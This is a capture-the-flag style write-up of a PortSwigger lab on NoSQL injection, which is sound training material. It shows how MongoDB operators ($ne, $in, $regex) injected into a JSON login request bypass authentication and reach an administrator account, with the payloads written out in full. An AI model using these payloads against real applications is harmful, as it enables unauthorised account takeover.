# Exploiting NoSQL operator injection to bypass authentication

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication), you'll learn: Exploiting NoSQL operator injection to bypass authentication! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to [NoSQL injection](https://portswigger.net/web-security/nosql-injection) using MongoDB operators.

To solve the lab, log into the application as the `administrator` user.

You can log in to your own account using the following credentials: `wiener:peter`.

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009141507.png)

In here, we can view some products.

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009141607.png)

**Let's try to login as user `wiener` normally:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009141653.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009141702.png)

As expected, it redirected to the user's profile page.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009141739.png)

When we clicked the "Log In" button, **it'll send a POST request to `/login` with parameter `username` and `password` in JSON format.**

**NoSQL operator injection:**

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.

You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.

**Submitting query operators:**

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

> Note:
>  
> You can use the [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) extension to automatically convert the request method and change a URL-encoded `POST` request to JSON.

**Detecting operator injection in MongoDB:**

Consider a vulnerable application that accepts a username and password in the body of a `POST` request:

```json
{
    "username": "wiener",
    "password": "peter"
}
```

Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:

```json
{
    "username":{
        "$ne": "invalid"
    },
    "password": {"peter"}
}
```

If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:

```json
{
    "username":{
        "$ne": "invalid"
    },
    "password":{
        "$ne": "invalid"
    }
}
```

This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:

```json
{
    "username":{
        "$in":[
            "admin",
            "administrator",
            "superadmin"
        ]
    },
    "password":{
        "$ne": ""
    }
}
```

Now, let's try to login as user `wiener` but with an incorrect password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009142112.png)

It respond to us with "Invalid username or password".

**We can try to detect operator injection in MongoDB with the following payload:**
```json
{
    "username": "wiener",
    "password":{
        "$ne": "foobar"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009142652.png)

It redirected us to the profile page! Which means **the login page is vulnerable to authentication bypass via MongoDB operator injection!**

## Exploitation

**Let's try the same thing but with username `administrator`!**
```json
{
    "username": "administrator",
    "password":{
        "$ne": "foobar"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009142946.png)

Wait what? "Invalid username or password"?

**Maybe we can guess the administrator account's username with a guessable name via `$in` operator?**
```json
{
    "username":{
        "$in":[
            "admin",
            "administrator",
            "superadmin"
        ]
    },
    "password":{
        "$ne": "foobar"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009143815.png)

Nope.

**We can also use regular expression (regex) to search through a pattern:**
```json
{
    "username":{
        "$regex": "admin.*"
    },
    "password":{
        "$ne": "foobar"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009144002.png)

Oh! We have a hit for user `admindswdtg2i`!

**Let's repeat the request in our current browser session!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009144049.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009144102.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009144136.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-2/images/Pasted%20image%2020231009144143.png)

We successfully bypass the authentication and got the administrator account!

## Conclusion

What we've learned:

1. Exploiting NoSQL operator injection to bypass authentication